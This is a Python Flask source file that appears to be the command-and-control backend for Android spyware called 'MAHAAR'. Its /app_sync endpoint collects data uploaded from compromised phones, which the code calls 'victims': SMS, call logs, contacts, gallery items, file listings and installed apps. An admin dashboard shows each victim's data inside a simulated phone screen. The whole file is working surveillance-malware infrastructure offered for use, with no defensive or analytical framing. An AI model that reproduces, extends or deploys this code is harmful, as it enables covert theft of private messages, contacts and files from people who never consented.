import os
from flask import Flask, request, jsonify, render_template_string, send_from_directory
from datetime import datetime

app = Flask(__name__)
master_db = {}
victim_counters = {}

# پریمیم انٹرفیس
ADMIN_UI = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>MAHAAR ULTIMATE | COMMAND CENTER</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --mahaar-gold: #ffcc00; --bg-black: #050505; --phone-bg: #111; }
        body { background: var(--bg-black); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        
        /* Sidebar */
        .sidebar { width: 22%; background: #0a0a0a; border-right: 1px solid #222; display: flex; flex-direction: column; }
        .sidebar-header { padding: 20px; border-bottom: 1px solid #222; text-align: center; color: var(--mahaar-gold); font-size: 18px; font-weight: bold; letter-spacing: 2px; }
        .victim-list { flex-grow: 1; overflow-y: auto; padding: 10px; }
        .victim-card { padding: 15px; border: 1px solid #222; margin-bottom: 10px; cursor: pointer; border-radius: 10px; transition: 0.3s; background: #0e0e0e; }
        .victim-card:hover { border-color: var(--mahaar-gold); box-shadow: 0 0 10px rgba(255,204,0,0.1); }
        .victim-card.active { border-color: var(--mahaar-gold); background: #1a1a1a; }

        /* Main Display */
        .main-view { flex-grow: 1; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle, #1a1a1a 0%, #000 100%); position: relative; }

        /* Professional Phone Frame */
        .phone-frame { width: 350px; height: 700px; background: #000; border: 12px solid #252525; border-radius: 50px; position: relative; box-shadow: 0 0 50px rgba(0,0,0,0.5); display: flex; flex-direction: column; overflow: hidden; }
        .phone-notch { width: 160px; height: 28px; background: #252525; position: absolute; top: 0; left: 50%; transform: translateX(-50%); border-bottom-left-radius: 20px; border-bottom-right-radius: 20px; z-index: 100; }
        
        .phone-screen { flex-grow: 1; background: url('https://w0.peakpx.com/wallpaper/1017/633/HD-wallpaper-amoled-abstract-dark-fluid.jpg') center/cover; padding: 25px; position: relative; overflow-y: auto; }
        .mahaar-brand { text-align: center; color: var(--mahaar-gold); font-size: 22px; font-weight: bold; margin-top: 25px; letter-spacing: 5px; text-shadow: 0 0 10px rgba(255,204,0,0.5); }

        /* App Grid */
        .app-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-top: 40px; }
        .app-box { text-align: center; cursor: pointer; }
        .app-box i { width: 60px; height: 60px; background: rgba(255,255,255,0.08); border-radius: 15px; display: flex; align-items: center; justify-content: center; font-size: 28px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); transition: 0.3s; }
        .app-box:hover i { transform: translateY(-5px); background: var(--mahaar-gold); color: black; }
        .app-box span { font-size: 11px; display: block; margin-top: 8px; font-weight: 500; }

        /* Data Viewer Layer */
        #phone-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 200; display: none; flex-direction: column; }
        .overlay-header { padding: 15px; background: #111; border-bottom: 1px solid #222; display: flex; align-items: center; font-weight: bold; }
        .overlay-content { flex-grow: 1; overflow-y: auto; padding: 15px; }

        /* File Manager Style */
        .file-row { display: flex; align-items: center; padding: 12px; border-bottom: 1px solid #222; transition: 0.2s; cursor: pointer; }
        .file-row:hover { background: #1a1a1a; }
        .file-info { flex-grow: 1; margin-left: 15px; font-size: 13px; }
        .download-btn { color: var(--mahaar-gold); font-size: 18px; padding: 5px; }

        /* SMS/Call Cards */
        .data-card { background: #111; border: 1px solid #333; padding: 12px; border-radius: 10px; margin-bottom: 10px; font-size: 13px; }
        .data-card b { color: var(--mahaar-gold); }
    </style>
</head>
<body>

<div class="sidebar">
    <div class="sidebar-header">MAHAAR ADMIN</div>
    <div class="victim-list">
        {% for id, data in master_db.items() %}
        <div class="victim-card" id="card-{{ id }}" onclick="selectVictim('{{ id }}')">
            <div style="font-weight:bold; color:var(--mahaar-gold);">📱 {{ data.display_name }}</div>
            <div style="font-size:11px; color:#777; margin-top:5px;">ID: {{ id }}</div>
            <div style="font-size:10px; color:#4cd964; margin-top:3px;">● Last Sync: {{ data.time }}</div>
        </div>
        {% endfor %}
    </div>
</div>

<div class="main-view">
    <div class="phone-frame">
        <div class="phone-notch"></div>
        <div class="phone-screen" id="home-screen">
            <div class="mahaar-brand">MAHAAR</div>
            
            <div class="app-grid">
                <div class="app-box" onclick="openApp('sms_all', 'Messages', 'fa-comments', '#4cd964')">
                    <i class="fas fa-comments" style="color:#4cd964;"></i><span>SMS</span>
                </div>
                <div class="app-box" onclick="openApp('calls_all', 'Phone', 'fa-phone-alt', '#007aff')">
                    <i class="fas fa-phone-alt" style="color:#007aff;"></i><span>Phone</span>
                </div>
                <div class="app-box" onclick="openApp('contacts_all', 'Contacts', 'fa-address-book', '#ff9500')">
                    <i class="fas fa-address-book" style="color:#ff9500;"></i><span>Contacts</span>
                </div>
                <div class="app-box" onclick="openApp('media_map', 'Gallery', 'fa-images', '#ff2d55')">
                    <i class="fas fa-images" style="color:#ff2d55;"></i><span>Gallery</span>
                </div>
                <div class="app-box" onclick="openApp('storage_all', 'File Manager', 'fa-folder-open', '#ffcc00')">
                    <i class="fas fa-folder-open" style="color:#ffcc00;"></i><span>Files</span>
                </div>
                <div class="app-box" onclick="openApp('apps_all', 'Play Store', 'fa-th-large', '#00d2ff')">
                    <i class="fas fa-th-large" style="color:#00d2ff;"></i><span>Apps</span>
                </div>
            </div>
        </div>

        <div id="phone-overlay">
            <div class="overlay-header">
                <i class="fas fa-chevron-left" onclick="closeApp()" style="margin-right:20px; cursor:pointer;"></i>
                <span id="app-title">App Name</span>
            </div>
            <div class="overlay-content" id="app-body"></div>
        </div>
    </div>
</div>

<script>
    const db = {{ master_db|tojson }};
    let activeId = null;

    function selectVictim(id) {
        activeId = id;
        document.querySelectorAll('.victim-card').forEach(c => c.classList.remove('active'));
        document.getElementById('card-'+id).classList.add('active');
    }

    function openApp(key, name, icon, color) {
        if(!activeId) return alert("Select a device first!");
        const overlay = document.getElementById('phone-overlay');
        const body = document.getElementById('app-body');
        document.getElementById('app-title').innerText = name;
        overlay.style.display = 'flex';
        body.innerHTML = "";

        let data = db[activeId][key];

        if (key === 'storage_all' || key === 'media_map') {
            renderFiles(data, body);
        } else if (Array.isArray(data)) {
            data.forEach(item => {
                let card = '<div class="data-card">';
                for(let k in item) card += `<b>${k}:</b> ${item[k]}<br>`;
                card += '</div>';
                body.innerHTML += card;
            });
        } else {
            body.innerHTML = '<pre style="font-size:10px; color:#888;">' + JSON.stringify(data, null, 2) + '</pre>';
        }
    }

    function renderFiles(files, container) {
        // یہاں ہم لسٹ دکھائیں گے
        if(typeof files === 'string') {
            files.split(',').forEach(f => {
                container.innerHTML += `
                <div class="file-row">
                    <i class="fas fa-file" style="color:#ffcc00;"></i>
                    <div class="file-info">${f.trim()}</div>
                    <i class="fas fa-download download-btn" title="Download"></i>
                </div>`;
            });
        } else {
            container.innerHTML = "Opening folder tree...";
            // Recursive tree display logic goes here
        }
    }

    function closeApp() { document.getElementById('phone-overlay').style.display = 'none'; }
</script>

</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(ADMIN_UI, master_db=master_db)

@app.route('/app_sync', methods=['POST'])
def sync():
    try:
        data = request.json
        uid = data.get("device_id", "ID")
        model = data.get("device", "Unknown")
        
        if model not in victim_counters: victim_counters[model] = 0
        else: victim_counters[model] += 1
        
        data["display_name"] = f"{model} - {victim_counters[model]}"
        data["time"] = datetime.now().strftime("%H:%M:%S")
        master_db[uid] = data
        return jsonify({"status": "SUCCESS"}), 200
    except:
        return jsonify({"status": "FAILED"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
